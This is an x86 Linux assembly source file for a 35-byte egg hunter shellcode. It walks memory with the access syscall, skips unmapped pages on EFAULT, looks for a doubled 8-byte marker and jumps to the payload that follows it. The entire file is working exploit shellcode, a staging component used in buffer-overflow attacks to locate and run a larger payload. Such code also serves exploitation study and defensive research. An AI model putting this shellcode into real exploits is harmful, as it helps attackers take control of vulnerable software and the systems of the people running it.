; linux x86 Egg Hunter using access (35 bytes)
; Egg size: 8 bytes
 
global _start
 
        section .text
 
_start:
        xor edx, edx
 
npage:
        or dx, 0xfff
 
naddr:
        inc edx
        lea ebx, [edx+0x4]
        push byte 0x21
        pop eax
        int 0x80
 
        cmp al, 0xf2        ; check for EFAULT
        je npage            ; if yes, keep searching
        mov eax, 0x50905090 ; Our tag
        mov edi, edx
        scasd
        jne naddr
        scasd
        jne naddr
        jmp edi